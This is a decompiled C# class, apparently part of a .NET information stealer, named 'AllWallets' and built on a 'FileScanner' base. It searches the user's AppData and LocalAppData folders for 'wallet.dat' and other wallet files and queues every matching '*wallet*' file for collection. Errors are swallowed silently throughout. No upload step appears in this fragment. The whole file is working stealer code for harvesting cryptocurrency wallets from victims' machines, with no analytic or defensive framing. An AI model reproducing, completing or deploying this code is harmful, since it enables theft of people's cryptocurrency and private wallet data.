using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000019 RID: 25
public class AllWallets : FileScanner
{
	// Token: 0x0600009B RID: 155 RVA: 0x00007DC0 File Offset: 0x00005FC0
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty).Replace(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\", string.Empty);
	}

	// Token: 0x0600009C RID: 156 RVA: 0x00007E10 File Offset: 0x00006010
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			List<string> list2 = new List<string>();
			list2.AddRange(FileCopier.FindPaths(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), 2, 1, new string[]
			{
				"wallet.dat",
				"wallet"
			}));
			list2.AddRange(FileCopier.FindPaths(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), 2, 1, new string[]
			{
				"wallet.dat",
				"wallet"
			}));
			try
			{
				foreach (string fileName in list2)
				{
					string tag = new FileInfo(fileName).Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty).Replace(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\", string.Empty).Split(new char[]
					{
						'\\'
					})[0];
					list.Add(new FileScannerArg
					{
						Tag = tag,
						Directory = new FileInfo(fileName).Directory.FullName,
						Pattern = "*wallet*",
						Recoursive = false
					});
				}
			}
			catch
			{
			}
		}
		catch
		{
		}
		return list;
	}
}
